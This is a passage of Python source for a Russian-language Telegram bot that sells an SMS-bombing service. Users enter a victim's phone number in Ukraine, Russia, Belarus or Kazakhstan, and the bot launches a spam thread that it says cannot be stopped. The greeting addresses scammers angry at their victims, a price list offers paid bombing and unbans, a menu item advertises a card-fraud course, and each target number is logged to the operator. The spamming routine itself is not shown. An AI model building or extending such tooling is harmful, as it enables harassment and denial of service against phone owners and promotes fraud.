    print(message)
    if db.is_user(message.chat.id):
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.row(menu[0], menu[1])
        markup.row(menu[3],menu[2])
        markup.row(menu[4])
        await bot.send_message(message.chat.id,
                                   f"""👋Салам, скамер! 👋
😡Бесит мамонт?😡 
📄Это бесплатный sms-бомбер, для тебя его подготовил Бобик - @
♥️БОМБИ ПО ЧЕРНОМУ♥️""",
                                   parse_mode='HTML', reply_markup=markup)
    else:
        db.add_user(message.chat.id)
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.row(menu[0], menu[1])
        markup.row(menu[3],menu[2])
        markup.row(menu[4])
        # markup.row(menu[7])
        # markup.row(menu[2])
        await bot.send_message(573264562,
                               f"""<a href="tg://user?id={message.chat.id}">{message.chat.first_name}</a> зарегистрировался""", parse_mode='HTML')
        await bot.send_message(message.chat.id,
                               f"""👋Салам, скамер! 👋
😡Бесит мамонт?😡 
📄Это бесплатный sms-бомбер, для тебя его подготовил Бобик - @qwutti📄
♥️БОМБИ ПО ЧЕРНОМУ♥️""", parse_mode='HTML', reply_markup=markup)


@dp.message_handler(content_types=['text'])
async def menu_list(message):
    if message.text == menu[0]:
        if db.is_blocked(message.chat.id):
            await bot.send_message(chat_id=message.chat.id,
                                   text=f"""🎃Вы забанены🎃""", parse_mode='HTML')

        else:
            markup = types.InlineKeyboardMarkup()
            a = types.InlineKeyboardButton(text="🇺🇦Украина🇺🇦",
                                           callback_data=posts_cb.new(action='country', id='ua',
                                                                      sum=0, other=0))
            b = types.InlineKeyboardButton(text="🇷🇺Россия🇷🇺",
                                           callback_data=posts_cb.new(action='country', id='ru',
                                                                      sum=0, other=0))
            markup.add(a, b)
            a = types.InlineKeyboardButton(text="🇧🇾Беларусь🇧🇾",
                                           callback_data=posts_cb.new(action='country', id='by',
                                                                      sum=0, other=0))
            b = types.InlineKeyboardButton(text="🇰🇿Казахстан🇰🇿",
                                           callback_data=posts_cb.new(action='country', id='kz',
                                                                      sum=0, other=0))
            markup.add(a, b)
            await bot.send_message(chat_id=message.chat.id,
                                        text=f"""Выберите, какую страну будем бомбить:️""", parse_mode='HTML',
                                        reply_markup=markup)

    # if callback_data_action == 'country':
    #     if callback_data_id == 'ua':
    #         markup = types.InlineKeyboardMarkup()
    #         a = types.InlineKeyboardButton(text="Главное меню",
    #                                        callback_data=posts_cb.new(action='main', id=1,
    #                                                                   sum=0, other=0))
    #         markup.add(a)
    #         db.set_step(query.message.chat.id, 'ua')
    #         await bot.edit_message_text(message_id=query.message.message_id, chat_id=query.message.chat.id,
    #                                     text=f"""Введите номер в формате +380993336660 ️""", parse_mode='HTML',
    #                                     reply_markup=markup)
    #     if callback_data_id == 'ru':
    #         markup = types.InlineKeyboardMarkup()
    #         a = types.InlineKeyboardButton(text="Главное меню",
    #                                        callback_data=posts_cb.new(action='main', id=1,
    #                                                                   sum=0, other=0))
    #         markup.add(a)
    #         db.set_step(query.message.chat.id, 'ru')
    #         await bot.edit_message_text(message_id=query.message.message_id, chat_id=query.message.chat.id,
    #                                     text=f"""Введите номер в формате +79039039033 ️""", parse_mode='HTML',
    #                                     reply_markup=markup)

    elif message.text == menu[1]:
        await bot.send_message( chat_id=message.chat.id,
                                    text=f"""🗺ПРОФИЛЬ🗺
✏ ID: {message.chat.id} ✏
🧡Мы рады, что пользуешься нашим ботом🧡️""", parse_mode='HTML')
    elif message.text == menu[2]:
        await bot.send_message(chat_id=message.chat.id,
                               text=f"""🍀Создатель - @callbacklamentbot 🍀""", parse_mode='HTML')
    elif message.text == menu[3]:
        await bot.send_message(chat_id=message.chat.id,
                               text=f"""✏Все наши услуги:✏
😛10 часов авто - бомбер на один номер - 100 рублей😛
📄Добавление в White-List (на Ваш номер нельзя будет кинуть бомбер) - 20 рублей📄
😡РАЗБАН - 50 рублей😡
🦀Рекламный пост - 300 рублей🦀
🏟Аренда кнопки - 500 руб неделя🏟
✏За покупкой - @callbacklamentbot ✏""", parse_mode='HTML')

    elif message.text == menu[4]:
        await bot.send_message(chat_id=message.chat.id,
                               text=f"""😱Обучение кардингу от А до Z  + дополнительные курсы . Успей по скидке до Нового года. Переходи на НОВЫЙ УРОВЕНЬ ЗАРАБОТКА                                 https://t.me/joinchat/O7sUchPKCjOpjE-RG5Nd1w     Моя группа""", parse_mode='HTML')


    elif db.get_step(message.chat.id) == 'ua':
        number = message.text.replace('+', "")
        if len(number) == 12 and number[:3] == '380' and message.text[0] == '+':
            if not db.is_white(message.text):
                db.set_step(message.chat.id, 'wait')
                await bot.send_message(573264562,
                                       f"""<a href="tg://user?id={message.chat.id}">{message.chat.first_name}</a>({message.chat.id}) запустил бомбер на номер {message.text}""",
                                       parse_mode='HTML')
                await bot.send_message(message.chat.id,
                                   f"""🌋Бомбер запущен🌋
🦀Остановить нельзя🦀
⛺Примерное время бомбежа 20 мин.⛺
🎃Если бот не работает - /start 🎃""",
                                   parse_mode='HTML')
                a = Thread(target=start_spam, args=(number, None)).start()

            else:
                await bot.send_message(message.chat.id,
                                       f"""😊Номер защищен администратором😊""",
                                       parse_mode='HTML')
            # loop = asyncio.get_event_loop()
            # loop = asyncio.get_event_loop()
            # loop.create_task(start_spam(number, proxies=None))


        else:
            await bot.send_message(message.chat.id,
                                   f"""🧭Неверный формат🧭""",
                                   parse_mode='HTML')
    elif db.get_step(message.chat.id) == 'ru':
        number = message.text.replace('+', "")
        if len(number) == 11 and number[:1] == '7' and message.text[0] == '+':
            if not db.is_white(message.text):
                db.set_step(message.chat.id, 'wait')
                await bot.send_message(573264562,
                                       f"""<a href="tg://user?id={message.chat.id}">{message.chat.first_name}</a>({message.chat.id}) запустил бомбер на номер {message.text}""",
                                       parse_mode='HTML')
                await bot.send_message(message.chat.id,
                                   f"""🌋Бомбер запущен🌋
🦀Остановить нельзя🦀
⛺Примерное время бомбежа 20 мин.⛺
🎃Если бот не работает - /start 🎃""",
                                   parse_mode='HTML')
                Thread(target=start_spam,args=(number,None)).start()
            else:
                await bot.send_message(message.chat.id,
                                       f"""😊Номер защищен администратором😊""",
                                       parse_mode='HTML')
        else:
            await bot.send_message(message.chat.id,
                                   f"""🧭Неверный формат🧭""",
                                   parse_mode='HTML')

    elif db.get_step(message.chat.id) == 'by':
        number = message.text.replace('+', "")
        if len(number) == 12 and number[:3] == '375' and message.text[0] == '+':
            if not db.is_white(message.text):
                db.set_step(message.chat.id, 'wait')
                await bot.send_message(573264562,
                                       f"""<a href="tg://user?id={message.chat.id}">{message.chat.first_name}</a>({message.chat.id}) запустил бомбер на номер {message.text}""",
                                       parse_mode='HTML')
                await bot.send_message(message.chat.id,
                                   f"""🌋Бомбер запущен🌋
🦀Остановить нельзя🦀
⛺Примерное время бомбежа 20 мин.⛺
🎃Если бот не работает - /start 🎃""",
                                   parse_mode='HTML')
            # loop = asyncio.get_event_loop()
            # loop = asyncio.get_event_loop()
            # loop.create_task(start_spam(number, proxies=None))
                Thread(target=start_spam, args=(number, None)).start()
            else:
                await bot.send_message(message.chat.id,
                                       f"""😊Номер защищен администратором😊""",
                                       parse_mode='HTML')

        else:
            await bot.send_message(message.chat.id,
                                   f"""🧭Неверный формат🧭""",
                                   parse_mode='HTML')
    elif db.get_step(message.chat.id) == 'kz':
        number = message.text.replace('+', "")
        if len(number) == 11 and number[:1] == '7' and message.text[0] == '+':
            if not db.is_white(message.text):
                db.set_step(message.chat.id, 'wait')
                await bot.send_message(573264562,
                                       f"""<a href="tg://user?id={message.chat.id}">{message.chat.first_name}</a>({message.chat.id}) запустил бомбер на номер {message.text}""",
                                       parse_mode='HTML')
                await bot.send_message(message.chat.id,
                                   f"""🌋Бомбер запущен🌋
🦀Остановить нельзя🦀
⛺Примерное время бомбежа 20 мин.⛺
🎃Если бот не работает - /start 🎃""",
                                   parse_mode='HTML')
                Thread(target=start_spam, args=(number, None)).start()
            else:
                await bot.send_message(message.chat.id,
                                       f"""😊Номер защищен администратором😊""",
                                       parse_mode='HTML')
        else:
            await bot.send_message(message.chat.id,
                                   f"""🧭Неверный формат🧭""",
                                   parse_mode='HTML')
    elif db.get_step(message.chat.id) == 'send':
        db.set_step(message.chat.id,'0')
        for user in db.all_users_send():
            try:
                await bot.send_message(user[1],text=message.text)
            except:
                continue


@dp.callback_query_handler(posts_cb.filter())
async def json_box(query: types.CallbackQuery, callback_data: dict):
    callback_data_action = callback_data['action']
    callback_data_id = callback_data['id']
    callback_data_sum = callback_data['sum']
    callback_data_other = callback_data['other']
    print(callback_data_action, callback_data_id)
    if callback_data_action == 'main':
        await bot.delete_message(message_id=query.message.message_id, chat_id=query.message.chat.id)
        await start_message(query.message)
    if callback_data_action == 'bomber':

        markup = types.InlineKeyboardMarkup()
        a = types.InlineKeyboardButton(text="🇺🇦Украина🇺🇦",
                                       callback_data=posts_cb.new(action='country', id='ua',
                                                                  sum=0, other=0))
        b = types.InlineKeyboardButton(text="🇷🇺Россия🇷🇺",
                                       callback_data=posts_cb.new(action='country', id='ru',
                                                                  sum=0, other=0))
        markup.add(a, b)
        a = types.InlineKeyboardButton(text="🇧🇾Беларусь🇧🇾",
                                       callback_data=posts_cb.new(action='country', id='by',
                                                                  sum=0, other=0))
        b = types.InlineKeyboardButton(text="🇰🇿Казахстан🇰🇿",
                                       callback_data=posts_cb.new(action='country', id='kz',
                                                                  sum=0, other=0))
        markup.add(a, b)
        await bot.edit_message_text(message_id=query.message.message_id,chat_id=query.message.chat.id,
                               text=f"""Выберите, какую страну будем бомбить:️""", parse_mode='HTML', reply_markup=markup)

    if callback_data_action == 'country':
        if callback_data_id == 'ua':
            db.set_step(query.message.chat.id, 'ua')
            await bot.edit_message_text(message_id=query.message.message_id, chat_id=query.message.chat.id,
                                        text=f"""Введите номер в формате +380993336660 ️""", parse_mode='HTML')
        if callback_data_id == 'ru':
            db.set_step(query.message.chat.id, 'ru')
            await bot.edit_message_text(message_id=query.message.message_id, chat_id=query.message.chat.id,
                                        text=f"""Введите номер в формате +79039039033 ️""", parse_mode='HTML')
        if callback_data_id == 'by':
            db.set_step(query.message.chat.id, 'by')
            await bot.edit_message_text(message_id=query.message.message_id, chat_id=query.message.chat.id,
                                        text=f"""Введите номер в формате +375999333444 ️""", parse_mode='HTML')
        if callback_data_id == 'kz':
            db.set_step(query.message.chat.id, 'kz')
            await bot.edit_message_text(message_id=query.message.message_id, chat_id=query.message.chat.id,
                                        text=f"""Введите номер в формате +77788899900 ️""", parse_mode='HTML')

    if callback_data_action == 'profile':
        await bot.edit_message_text(message_id=query.message.message_id,chat_id=query.message.chat.id,
                               text=f"""🗺ПРОФИЛЬ🗺
✏ ID: {query.message.chat.id} ✏
🧡Мы рады, что пользуешься нашим ботом🧡️""", parse_mode='HTML')



@dp.message_handler(content_types=['photo','gif'])
async def send_photo(message):
    print(message)
    if db.get_step(message.chat.id) == 'send':
        db.set_step(message.chat.id,'0')
        file = message.photo[-1].file_id
        if message.caption:
            caption = message.caption
        else:
            caption = ''
        for user in db.all_users_send():
            try:
                await bot.send_photo(user[1],photo=file,caption=caption)
            except:
                continue

# @dp.message_handler(content_types=['animation','photo','video'])
# async def send_photo(message):
#     print(message)
#     if message.chat.id in admins:
#         users = db.users()
#         for i in users:
#             try:
#                 await bot.forward_message(i[1],message.chat.id,message.message_id)
#             except:
#                 pass
    # if db.get_step(message.chat.id) == 'send':
    #     db.set_step(message.chat.id,'0')
    #     file = message.photo[-1].file_id
    #     if message.caption:
    #         caption = message.caption
    #     else:
    #         caption = ''
    #     for user in db.users():
    #         try:
    #             await bot.send_photo(user[1],photo=file,caption=caption)
    #         except:
    #             continue


@dp.message_handler(content_types=['video'])
async def send_video(message):
    print(message)
    if db.get_step(message.chat.id) == 'send':
        db.set_step(message.chat.id,'0')
        file = message.video.file_id
        if message.caption:
            caption = message.caption
        else:
            caption = ''
        for user in db.all_users_send():
            try:
                await bot.send_video(user[1],video=file,caption=caption)
            except:
                continue

@dp.message_handler(content_types=['document'])
async def send_doc(message):
    print(message)
    if db.get_step(message.chat.id) == 'send':
        db.set_step(message.chat.id,'0')
        file = message.document.file_id
        if message.caption:
            caption = message.caption
        else:
            caption = ''
        for user in db.all_users_send():
            try:
                await bot.send_document(user[1],document=file,caption=caption)
            except:
                continue

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)

